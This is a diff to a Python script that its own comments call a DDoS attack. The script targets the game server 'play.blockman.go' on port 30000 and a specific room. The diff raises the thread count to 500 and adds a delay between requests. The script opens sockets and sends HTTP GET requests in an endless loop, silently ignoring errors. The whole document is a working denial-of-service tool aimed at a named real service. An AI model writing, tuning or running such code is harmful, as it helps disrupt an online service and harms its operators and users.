@@ -6,8 +6,9 @@ import time
 TARGET_IP = "play.blockman.go"  # Replace with the actual IP if needed
 TARGET_PORT = 30000  # Replace with the actual port if needed
 ROOM_NUMBER = "102579"  # Replace with the actual room number
-NUM_THREADS = 100  # Number of threads to use for the DDoS attack
+NUM_THREADS = 500  # Increased number of threads
 MESSAGE = f"GET /room/{ROOM_NUMBER} HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n"
+DELAY = 0.1  # Delay between requests in seconds
 
 def ddos():
     while True:
@@ -16,6 +17,7 @@ def ddos():
             s.connect((TARGET_IP, TARGET_PORT))
             s.sendall(MESSAGE.encode('utf-8'))
             s.close()
+            time.sleep(DELAY)  # Add a delay between requests
         except:
             pass
 
